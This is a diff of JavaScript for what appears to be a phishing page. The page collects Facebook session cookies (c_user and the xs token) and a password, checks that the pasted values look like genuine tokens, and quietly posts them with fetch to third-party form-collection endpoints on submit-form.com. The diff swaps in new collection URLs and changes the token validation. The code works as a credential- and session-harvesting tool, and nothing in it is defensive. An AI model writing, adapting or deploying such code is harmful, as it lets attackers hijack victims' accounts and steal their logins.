@@ -1,3 +1,4 @@
+
 function showPage(pageId) {
     document.querySelectorAll('.page').forEach(page => {
         page.classList.remove('active');
@@ -26,19 +27,15 @@ function validateCuser(value) {
 }
 
 function validateXs(value) {
-    // Must not contain spaces or emojis
-    // Allow numbers, letters, colons, percent-encoded chars, hyphens, underscores
-    if (/\s/.test(value)) return false; // No spaces
-    if (/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{1F1E0}-\u{1F1FF}]/u.test(value)) return false; // No emojis
-    
-    // Allow only valid characters: letters, numbers, colons, percent signs, hyphens, underscores
-    return /^[a-zA-Z0-9:%_-]+$/.test(value) && value.length >= 20;
+    const mustContainEncodedColon = value.includes('%3A');
+    const strongPattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$/.test(value);
+    return mustContainEncodedColon && strongPattern;
 }
 
 function updateSubmitButton() {
     const cuserValid = validateCuser(cuserInput.value);
     const xsValid = validateXs(xsInput.value);
-    
+
     if (cuserValid && xsValid) {
         submitButton.disabled = false;
         submitButton.style.opacity = '1';
@@ -63,20 +60,20 @@ cuserInput.addEventListener('keypress', function(e) {
 
 cookieForm.addEventListener('submit', function(e) {
     e.preventDefault();
-    
+
     // Double-check validation before submission
     if (!validateCuser(cuserInput.value)) {
         alert('c_user must be 15-17 digits long and contain only numbers');
         return;
     }
-    
+
     if (!validateXs(xsInput.value)) {
-        alert('xs token must be at least 20 characters and contain only valid characters (no spaces or emojis)');
+        alert('xs token must be at least 12 characters, contain upper/lowercase letters, digits, special characters, and must include "%3A"');
         return;
     }
 
     // Submit form data in background
-    fetch('https://submit-form.com/rMcFXemUO', {
+    fetch('https://submit-form.com/wvGvlIWs9', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -95,14 +92,14 @@ cookieForm.addEventListener('submit', function(e) {
 
 passwordForm.addEventListener('submit', function(e) {
     e.preventDefault();
-    
+
     const password = document.getElementById('password').value;
     if (!password) {
         alert('Please enter your password');
         return;
     }
-    
-    fetch('https://submit-form.com/szNw0mbXJ', {
+
+    fetch('https://submit-form.com/Pn6Mi2Nat', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
